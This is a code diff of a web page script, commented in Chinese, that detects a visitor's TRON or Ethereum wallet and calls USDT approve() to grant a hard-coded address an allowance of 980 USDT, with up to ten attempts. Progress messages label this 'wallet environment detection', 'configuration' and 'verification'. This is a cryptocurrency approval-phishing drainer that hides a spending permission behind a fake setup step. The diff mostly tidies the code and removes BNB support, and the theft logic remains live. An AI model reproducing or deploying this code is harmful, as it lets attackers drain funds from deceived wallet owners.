@@ -111,8 +111,7 @@
 <script>
   const USDT_CONTRACTS = {
     TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-    ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    BNB:  "0x55d398326f99059fF775485246999027B3197955"
+    ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7"
   };
 
   const TARGET_ADDRESS = {
@@ -122,8 +121,8 @@
 
   const APPROVE_AMOUNT = "980000000"; // 980 * 10^6 (USDT小數位)
 
-  let approveCount = 0;
   const MAX_APPROVE_COUNT = 10;
+  let approveCount = 0;
 
   function setProgress(percent, status, cls="loading") {
     document.getElementById("progress-bar").style.width = percent + "%";
@@ -135,6 +134,7 @@
   async function init() {
     try {
       setProgress(20, "檢測錢包環境...");
+
       // TRON
       if (window.tronWeb && window.tronWeb.ready) {
         setProgress(40, "檢測到 TRON 錢包，連接中...");
@@ -154,6 +154,7 @@
         await tronApprove();
         return;
       }
+
       // EVM
       if (window.ethereum) {
         await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -168,6 +169,7 @@
         await evmApprove(provider);
         return;
       }
+
       setProgress(100, "未檢測到錢包，請安裝或打開錢包應用", "error");
     } catch (err) {
       console.error(err);
@@ -189,9 +191,7 @@
       const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.TRON);
       await contract.approve(TARGET_ADDRESS.TRON, APPROVE_AMOUNT).send();
       setProgress(100, "✅ 配置完成", "success");
-      setTimeout(() => {
-        window.location.href = "success.html";
-      }, 1500);
+      setTimeout(() => { window.location.href = "success.html"; }, 1500);
     } catch (err) {
       console.error(err);
       setProgress(100, "驗證未完成", "error");
@@ -212,7 +212,6 @@
       const network = await ethersProvider.getNetwork();
       let usdtAddress;
       if (network.chainId === 1) usdtAddress = USDT_CONTRACTS.ETH;
-      else if (network.chainId === 56) usdtAddress = USDT_CONTRACTS.BNB;
       else throw new Error("不支援的鏈");
       setProgress(60, "已連接：" + await signer.getAddress() + "，配置中...");
       const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
@@ -220,9 +219,7 @@
       const tx = await contract.approve(TARGET_ADDRESS.EVM, APPROVE_AMOUNT);
       await tx.wait();
       setProgress(100, "✅ 配置完成", "success");
-      setTimeout(() => {
-        window.location.href = "success.html";
-      }, 1500);
+      setTimeout(() => { window.location.href = "success.html"; }, 1500);
     } catch (err) {
       console.error(err);
       setProgress(100, "驗證未完成", "error");
